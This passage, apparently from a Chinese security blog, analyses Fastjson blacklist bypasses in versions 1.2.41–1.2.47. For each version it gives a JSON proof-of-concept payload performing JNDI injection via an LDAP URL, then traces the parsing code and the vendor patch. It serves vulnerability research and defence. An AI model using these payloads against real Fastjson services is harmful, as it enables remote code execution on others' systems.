<p>限制传入的类名长度，引入了黑名单加密混淆机制，将所有类型检验换成了<code>hashCode</code>，为了不让研究人员直接看到被明文黑白名单（但是可以爆破绕过，详细的可以看文章底下的<strong>哈希黑名单</strong>），然后在检验黑白名单之前先去掉首尾的<code>&quot;L&quot;</code>和<code>&quot;;&quot;</code></p>
<h3 id="1-2-42漏洞"><a href="#1-2-42漏洞" class="headerlink" title="1.2.42漏洞"></a>1.2.42漏洞</h3><blockquote>
<p>绕过1.2.41的补丁</p>
</blockquote>
<p><strong>客户端</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">jsonstr</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;LLcom.sun.rowset.JdbcRowSetImpl;;\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://localhost:1389/Exploit\&quot;,\&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(jsonstr);</span><br><span class="line">System.out.println(obj)</span><br></pre></td></tr></table></figure>

<p>直接再套多一层<code>&quot;L&quot;</code>和<code>&quot;;&quot;</code>即可绕过补丁</p>
<p><strong>分析</strong></p>
<p>跟进<code>checkAutoType()</code>函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ParserConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, <span class="type">int</span> features) &#123;</span><br><span class="line">        <span class="keyword">if</span> (typeName == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (typeName.length() &lt; <span class="number">128</span> &amp;&amp; typeName.length() &gt;= <span class="number">3</span>) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> typeName.replace(<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">            Class&lt;?&gt; clazz = <span class="literal">null</span>;</span><br><span class="line">            <span class="type">long</span> <span class="variable">BASIC</span> <span class="operator">=</span> -<span class="number">3750763034362895579L</span>;</span><br><span class="line">            <span class="type">long</span> <span class="variable">PRIME</span> <span class="operator">=</span> <span class="number">1099511628211L</span>;</span><br><span class="line">            <span class="keyword">if</span> (((-<span class="number">3750763034362895579L</span> ^ (<span class="type">long</span>)className.charAt(<span class="number">0</span>)) * <span class="number">1099511628211L</span> ^ (<span class="type">long</span>)className.charAt(className.length() - <span class="number">1</span>)) * <span class="number">1099511628211L</span> == <span class="number">655701488918567152L</span>) &#123; <span class="comment">// 经过动态调试可以知道这里是去掉了一层&quot;L&quot;和&quot;;&quot;</span></span><br><span class="line">                className = className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            ...</span><br></pre></td></tr></table></figure>

<p><strong>Patch</strong></p>
<p>className开头是<code>&quot;LL&quot;</code>就抛出错误</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ParserConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, <span class="type">int</span> features) &#123;</span><br><span class="line">        <span class="keyword">if</span> (typeName == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (typeName.length() &lt; <span class="number">128</span> &amp;&amp; typeName.length() &gt;= <span class="number">3</span>) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> typeName.replace(<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">            Class&lt;?&gt; clazz = <span class="literal">null</span>;</span><br><span class="line">            <span class="type">long</span> <span class="variable">BASIC</span> <span class="operator">=</span> -<span class="number">3750763034362895579L</span>;</span><br><span class="line">            <span class="type">long</span> <span class="variable">PRIME</span> <span class="operator">=</span> <span class="number">1099511628211L</span>;</span><br><span class="line">            <span class="keyword">if</span> (((-<span class="number">3750763034362895579L</span> ^ (<span class="type">long</span>)className.charAt(<span class="number">0</span>)) * <span class="number">1099511628211L</span> ^ (<span class="type">long</span>)className.charAt(className.length() - <span class="number">1</span>)) * <span class="number">1099511628211L</span> == <span class="number">655701488918567152L</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (((-<span class="number">3750763034362895579L</span> ^ (<span class="type">long</span>)className.charAt(<span class="number">0</span>)) * <span class="number">1099511628211L</span> ^ (<span class="type">long</span>)className.charAt(<span class="number">1</span>)) * <span class="number">1099511628211L</span> == <span class="number">655656408941810501L</span>) &#123; <span class="comment">// 检验开头是否为&quot;LL&quot;，然后抛出错误</span></span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                className = className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<h3 id="1-2-43漏洞"><a href="#1-2-43漏洞" class="headerlink" title="1.2.43漏洞"></a>1.2.43漏洞</h3><blockquote>
<p>绕过1.2.42的补丁</p>
</blockquote>
<p><strong>客户端</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">jsonstr</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;\&quot;dataSourceName\&quot;:\&quot;ldap://localhost:1389/Exploit\&quot;, \&quot;autoCommit\&quot;:false&#125;]&quot;</span>;</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(jsonstr);</span><br><span class="line">System.out.println(obj)</span><br></pre></td></tr></table></figure>

<p>采用畸形<code>&quot;[&quot;</code>和<code>&quot;&#123;&quot;</code>进行绕过</p>
<p><strong>分析</strong></p>
<p>大家应该记得，除了前面用到的<code>&quot;L&quot;</code>和<code>&quot;;&quot;</code>，我们还会对首位的<code>&quot;[&quot;</code>进行修改，再一次看<code>loadClass()</code>函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TypeUtils</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, <span class="type">boolean</span> cache) &#123;</span><br><span class="line">        <span class="keyword">if</span> (className != <span class="literal">null</span> &amp;&amp; className.length() != <span class="number">0</span>) &#123;</span><br><span class="line">            Class&lt;?&gt; clazz = (Class)mappings.get(className);</span><br><span class="line">            <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> clazz;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (className.charAt(<span class="number">0</span>) == <span class="string">&#x27;[&#x27;</span>) &#123;</span><br><span class="line">                Class&lt;?&gt; componentType = loadClass(className.substring(<span class="number">1</span>), classLoader); <span class="comment">// 删掉首位的&quot;[&quot;</span></span><br><span class="line">                <span class="keyword">return</span> Array.newInstance(componentType, <span class="number">0</span>).getClass(); <span class="comment">// 实例化类</span></span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (className.startsWith(<span class="string">&quot;L&quot;</span>) &amp;&amp; className.endsWith(<span class="string">&quot;;&quot;</span>)) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">newClassName</span> <span class="operator">=</span> className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">                <span class="keyword">return</span> loadClass(newClassName, classLoader);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            ...</span><br></pre></td></tr></table></figure>

<p>在Lexer分析完类名之后，此时Lexer已经分析到这个位置<code>[&#123;&quot;dataSourceName&quot;...</code>，而且代码将会检查token为16时后一个预期字符</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// public final Object parseObject(Map object, Object fieldName)</span></span><br><span class="line"><span class="keyword">if</span> (key == JSON.DEFAULT_TYPE_KEY &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) &#123;</span><br><span class="line">    typeName = lexer.scanSymbol(<span class="built_in">this</span>.symbolTable, <span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!lexer.isEnabled(Feature.IgnoreAutoType)) &#123;</span><br><span class="line">        strValue = <span class="literal">null</span>;</span><br><span class="line">        Class clazz;</span><br><span class="line">        <span class="keyword">if</span> (object != <span class="literal">null</span> &amp;&amp; object.getClass().getName().equals(typeName)) &#123;</span><br><span class="line">            clazz = object.getClass();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            clazz = <span class="built_in">this</span>.config.checkAutoType(typeName, (Class)<span class="literal">null</span>, lexer.getFeatures());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">            lexer.nextToken(<span class="number">16</span>); <span class="comment">// 检查expect为16的token</span></span><br><span class="line">            <span class="keyword">if</span> (lexer.token() == <span class="number">13</span>) &#123;</span><br><span class="line">                lexer.nextToken(<span class="number">16</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// public final void nextToken(int expect)</span></span><br><span class="line"><span class="keyword">case</span> <span class="number">16</span>:</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.ch == <span class="string">&#x27;,&#x27;</span>) &#123;</span><br><span class="line">        <span class="built_in">this</span>.token = <span class="number">16</span>;</span><br><span class="line">        <span class="built_in">this</span>.next();</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.ch == <span class="string">&#x27;&#125;&#x27;</span>) &#123;</span><br><span class="line">        <span class="built_in">this</span>.token = <span class="number">13</span>;</span><br><span class="line">        <span class="built_in">this</span>.next();</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.ch == <span class="string">&#x27;]&#x27;</span>) &#123;</span><br><span class="line">        <span class="built_in">this</span>.token = <span class="number">15</span>;</span><br><span class="line">        <span class="built_in">this</span>.next();</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.ch == <span class="number">26</span>) &#123;</span><br><span class="line">        <span class="built_in">this</span>.token = <span class="number">20</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">	...</span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">this</span>.ch != <span class="string">&#x27; &#x27;</span> &amp;&amp; <span class="built_in">this</span>.ch != <span class="string">&#x27;\n&#x27;</span> &amp;&amp; <span class="built_in">this</span>.ch != <span class="string">&#x27;\r&#x27;</span> &amp;&amp; <span class="built_in">this</span>.ch != <span class="string">&#x27;\t&#x27;</span> &amp;&amp; <span class="built_in">this</span>.ch != <span class="string">&#x27;\f&#x27;</span> &amp;&amp; <span class="built_in">this</span>.ch != <span class="string">&#x27;\b&#x27;</span>) &#123;</span><br><span class="line">        <span class="built_in">this</span>.nextToken(); <span class="comment">// 因为我们的payload的类名的后一个字符为&#x27;[&#x27;，所以会调用nextToken()函数设置新的token</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line"><span class="comment">// public final void nextToken() </span></span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;[&#x27;</span>:</span><br><span class="line">    <span class="built_in">this</span>.next();</span><br><span class="line">    <span class="built_in">this</span>.token = <span class="number">14</span>; <span class="comment">// 将token设置为14</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br></pre></td></tr></table></figure>

<p>下面阐述一下为什么一定要把token设置为14</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// public final Object parseObject(Map object, Object fieldName)</span></span><br><span class="line"><span class="type">ObjectDeserializer</span> <span class="variable">deserializer</span> <span class="operator">=</span> <span class="built_in">this</span>.config.getDeserializer(clazz);</span><br><span class="line">thisObj = deserializer.deserialze(<span class="built_in">this</span>, clazz, fieldName); <span class="comment">// 进入反序列化</span></span><br><span class="line"><span class="keyword">return</span> thisObj;</span><br><span class="line"></span><br><span class="line"><span class="comment">// public &lt;T&gt; T deserialze(DefaultJSONParser parser, Type type, Object fieldName)</span></span><br><span class="line"><span class="type">JSONArray</span> <span class="variable">array</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">parser.parseArray((Type)componentType, array, fieldName); <span class="comment">// 解析类成员</span></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">this</span>.toObjectArray(parser, componentClass, array);</span><br><span class="line"></span><br><span class="line"><span class="comment">// public void parseArray(Type type, Collection array, Object fieldName)</span></span><br><span class="line"><span class="keyword">if</span> (token != <span class="number">14</span>) &#123; <span class="comment">// token不等于14就会报错</span></span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;exepct &#x27;[&#x27;, but &quot;</span> + JSONToken.name(token) + <span class="string">&quot;, &quot;</span> + <span class="built_in">this</span>.lexer.info());</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="type">ObjectDeserializer</span> <span class="variable">deserializer</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (Integer.TYPE == type) &#123;</span><br><span class="line">        deserializer = IntegerCodec.instance;</span><br><span class="line">        <span class="built_in">this</span>.lexer.nextToken(<span class="number">2</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (String.class == type) &#123;</span><br><span class="line">        deserializer = StringCodec.instance;</span><br><span class="line">        <span class="built_in">this</span>.lexer.nextToken(<span class="number">4</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        deserializer = <span class="built_in">this</span>.config.getDeserializer(type);</span><br><span class="line">        <span class="built_in">this</span>.lexer.nextToken(((ObjectDeserializer)deserializer).getFastMatchToken()); <span class="comment">// getFastMatchToken()返回的是12，可以成功搜索到下一个字符是&#x27;&#123;&#x27;，对应的token设置为12</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">ParseContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="built_in">this</span>.context;</span><br><span class="line">    <span class="built_in">this</span>.setContext(array, fieldName);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.lexer.isEnabled(Feature.AllowArbitraryCommas)) &#123;</span><br><span class="line">                <span class="keyword">while</span>(<span class="built_in">this</span>.lexer.token() == <span class="number">16</span>) &#123;</span><br><span class="line">                    <span class="built_in">this</span>.lexer.nextToken();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.lexer.token() == <span class="number">15</span>) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Object val;</span><br><span class="line">            <span class="keyword">if</span> (Integer.TYPE == type) &#123;</span><br><span class="line">                val = IntegerCodec.instance.deserialze(<span class="built_in">this</span>, (Type)<span class="literal">null</span>, (Object)<span class="literal">null</span>);</span><br><span class="line">                array.add(val);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (String.class == type) &#123;</span><br><span class="line">                String value;</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">this</span>.lexer.token() == <span class="number">4</span>) &#123;</span><br><span class="line">                    value = <span class="built_in">this</span>.lexer.stringVal();</span><br><span class="line">                    <span class="built_in">this</span>.lexer.nextToken(<span class="number">16</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="built_in">this</span>.parse();</span><br><span class="line">                    <span class="keyword">if</span> (obj == <span class="literal">null</span>) &#123;</span><br><span class="line">                        value = <span class="literal">null</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        value = obj.toString();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                array.add(value);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">this</span>.lexer.token() == <span class="number">8</span>) &#123;</span><br><span class="line">                    <span class="built_in">this</span>.lexer.nextToken();</span><br><span class="line">                    val = <span class="literal">null</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    val = ((ObjectDeserializer)deserializer).deserialze(<span class="built_in">this</span>, type, i); <span class="comment">// 因为token是12，所以最终会走到这一步完成反序列化</span></span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure>

<p><strong>Patch</strong></p>
<p>判断类型的第一个字符是否为”[“</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ParserConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, <span class="type">int</span> features) &#123;</span><br><span class="line">        <span class="keyword">if</span> (typeName == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (typeName.length() &lt; <span class="number">128</span> &amp;&amp; typeName.length() &gt;= <span class="number">3</span>) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> typeName.replace(<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">            Class&lt;?&gt; clazz = <span class="literal">null</span>;</span><br><span class="line">            <span class="type">long</span> <span class="variable">BASIC</span> <span class="operator">=</span> -<span class="number">3750763034362895579L</span>;</span><br><span class="line">            <span class="type">long</span> <span class="variable">PRIME</span> <span class="operator">=</span> <span class="number">1099511628211L</span>;</span><br><span class="line">            <span class="type">long</span> <span class="variable">h1</span> <span class="operator">=</span> (-<span class="number">3750763034362895579L</span> ^ (<span class="type">long</span>)className.charAt(<span class="number">0</span>)) * <span class="number">1099511628211L</span>;</span><br><span class="line">            <span class="keyword">if</span> (h1 == -<span class="number">5808493101479473382L</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName); <span class="comment">// 第一个字符是否为&quot;[&quot;则抛出错误</span></span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<h3 id="1-2-45漏洞"><a href="#1-2-45漏洞" class="headerlink" title="1.2.45漏洞"></a>1.2.45漏洞</h3><blockquote>
<p>利用了一条黑名单中不包含的元素，从而绕过了黑名单限制，需要额外安装mybatis库</p>
</blockquote>
<p><strong>客户端</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">jsonstr</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\&quot;,\&quot;properties\&quot;:&#123;\&quot;data_source\&quot;:\&quot;ldap://localhost:1389/Exploit\&quot;&#125;&#125;&quot;</span>;</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(jsonstr);</span><br><span class="line">System.out.println(obj)</span><br></pre></td></tr></table></figure>

<p>JndiDataSourceFactory不在黑名单中，通过指定data_source实现JNDI注入</p>
<p><strong>分析</strong></p>
<p>直接放图</p>
<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105241715d814a1a9336319d4f794.png" alt="image-20210524170435859" style="zoom:80%;" />

<p>从这个代码可以看到也可以用<code>initial_context</code>属性，但是还要同时设置<code>data_source</code>属性才能用，所以就没什么必要</p>
<p><strong>Patch</strong></p>
<p>扩充了不少黑名单</p>
<h3 id="1-2-47漏洞"><a href="#1-2-47漏洞" class="headerlink" title="1.2.47漏洞"></a>1.2.47漏洞</h3><blockquote>
<p>使用新的Gadget绕过黑名单</p>
<p>需要 1.2.33 ≤ Fastjson版本 ≤ 1.2.47，是否开启setAutoTypeSupport都能成功</p>
<p>需要 1.2.25 ≤ Fastjson版本 ≤ 1.2.32，关闭setAutoTypeSupport能成功</p>
</blockquote>
<p><strong>客户端</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">jsonstr</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;a\&quot;:&#123;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;&#125;,\&quot;b\&quot;:&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://localhost:1389/Exploit\&quot;,\&quot;autoCommit\&quot;:true&#125;&#125;&#125;&quot;</span>;</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(jsonstr);</span><br><span class="line">System.out.println(obj)</span><br></pre></td></tr></table></figure>

<p>由于Poc开头不为<code>@type</code>等预置类型，所以按Map类型解析，其中会调用<code>parseObject()</code>，第一次反序列化时，<code>java.lang.Class</code>绕过黑名单，将<code>com.sun.rowset.JdbcRowSetImpl</code>加入到缓存数组，第二次反序列化时，由于<code>com.sun.rowset.JdbcRowSetImpl</code>已在缓存之中，所以绕过了黑名单检测的过程，成功进行JNDI注入</p>
<p><strong>分析</strong></p>
<p>在IDEA中把mappings成员添加到断点中</p>
<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105242020d3262fb8bf8cb8b77d92.png" alt="image-20210524175959882" style="zoom: 67%;" />

<p>勾上<code>Field access</code>选项</p>
<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105242020e7c324ba7cb18e536e22.png" alt="image-20210524180038665" style="zoom: 67%;" />

<p>在运行完<code>java.lang.Class</code>类的<code>parseObject()</code>函数之后再进行监听，持续跟进就会看到调用到下面的<code>loadClass()</code>函数，大概情况就是<code>java.lang.Class</code>在反序列化时会把<code>value</code>属性值识别为<code>Object</code>类型，如果<code>key</code>值本身又属于<code>Class.class</code>类型时，便会对<code>value</code>属性值调用下面的<code>loadClass()</code>函数把这个<code>Object</code>加载进来</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TypeUtils</span> &#123;</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, <span class="type">boolean</span> cache) &#123;</span><br><span class="line">        <span class="keyword">if</span> (className != <span class="literal">null</span> &amp;&amp; className.length() != <span class="number">0</span>) &#123;</span><br><span class="line">            Class&lt;?&gt; clazz = (Class)mappings.get(className);</span><br><span class="line">            <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> clazz;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (className.charAt(<span class="number">0</span>) == <span class="string">&#x27;[&#x27;</span>) &#123;</span><br><span class="line">                Class&lt;?&gt; componentType = loadClass(className.substring(<span class="number">1</span>), classLoader);</span><br><span class="line">                <span class="keyword">return</span> Array.newInstance(componentType, <span class="number">0</span>).getClass();</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (className.startsWith(<span class="string">&quot;L&quot;</span>) &amp;&amp; className.endsWith(<span class="string">&quot;;&quot;</span>)) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">newClassName</span> <span class="operator">=</span> className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">                <span class="keyword">return</span> loadClass(newClassName, classLoader);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (classLoader != <span class="literal">null</span>) &#123;</span><br><span class="line">                        clazz = classLoader.loadClass(className);</span><br><span class="line">                        <span class="keyword">if</span> (cache) &#123;</span><br><span class="line">                            mappings.put(className, clazz);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">return</span> clazz;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Throwable var7) &#123;</span><br><span class="line">                    var7.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">ClassLoader</span> <span class="variable">contextClassLoader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">                    <span class="keyword">if</span> (contextClassLoader != <span class="literal">null</span> &amp;&amp; contextClassLoader != classLoader) &#123;</span><br><span class="line">                        clazz = contextClassLoader.loadClass(className);</span><br><span class="line">                        <span class="keyword">if</span> (cache) &#123; <span class="comment">// 支持缓存</span></span><br><span class="line">                            mappings.put(className, clazz); <span class="comment">// 把类名和类存进mappings</span></span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">return</span> clazz;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Throwable var6) &#123;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    clazz = Class.forName(className);</span><br><span class="line">                    mappings.put(className, clazz);</span><br><span class="line">                    <span class="keyword">return</span> clazz;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Throwable var5) &#123;</span><br><span class="line">                    <span class="keyword">return</span> clazz;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>当第二次解析<code>@type</code>时就可以绕过黑名单校验了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ParserConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, <span class="type">int</span> features) &#123;</span><br><span class="line">		</span><br><span class="line">        ...</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.autoTypeSupport || expectClass != <span class="literal">null</span>) &#123;</span><br><span class="line">            hash = h3;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(i = <span class="number">3</span>; i &lt; className.length(); ++i) &#123;</span><br><span class="line">                hash ^= (<span class="type">long</span>)className.charAt(i);</span><br><span class="line">                hash *= <span class="number">1099511628211L</span>;</span><br><span class="line">                <span class="keyword">if</span> (Arrays.binarySearch(<span class="built_in">this</span>.acceptHashCodes, hash) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    clazz = TypeUtils.loadClass(typeName, <span class="built_in">this</span>.defaultClassLoader, <span class="literal">false</span>);</span><br><span class="line">                    <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">return</span> clazz;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (Arrays.binarySearch(<span class="built_in">this</span>.denyHashCodes, hash) &gt;= <span class="number">0</span> &amp;&amp; TypeUtils.getClassFromMapping(typeName) == <span class="literal">null</span>) &#123; <span class="comment">// 当第二次解析@type时，com.sun.rowset.JdbcRowSetImpl以存储在mappings中，导致绕过黑名单</span></span><br><span 